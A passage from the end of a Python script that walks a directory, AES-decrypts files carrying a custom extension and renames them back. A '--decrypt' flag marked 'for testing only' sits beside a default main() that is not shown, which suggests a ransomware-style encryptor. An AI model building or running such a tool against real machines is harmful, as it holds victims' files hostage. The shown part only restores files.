        print(f"\n[*] Scanning: {target_dir}")
        for dirpath, _, files in os.walk(target_dir):
            for filename in files:
                if filename.endswith(EXTENSION):
                    file_path = os.path.join(dirpath, filename)
                    original_path = file_path[:-len(EXTENSION)]
                    
                    try:
                        modify_file_inplace(file_path, aes_cipher.decrypt)
                        os.rename(file_path, original_path)
                        decrypted_count += 1
                        if decrypted_count % 100 == 0:
                            print(f"[+] Decrypted: {decrypted_count} files")
                    except Exception as e:
                        error_count += 1
                        if error_count <= 10:
                            print(f"[-] Failed: {file_path} - {e}")
    
    print("\n" + "=" * 70)
    print("DECRYPTION COMPLETE!")
    print(f"Total files decrypted: {decrypted_count}")
    print(f"Errors: {error_count}")
    print("=" * 70)


if __name__ == "__main__":
    # Check for decryption mode (for testing only)
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        decrypt_files()
    else:
        main()
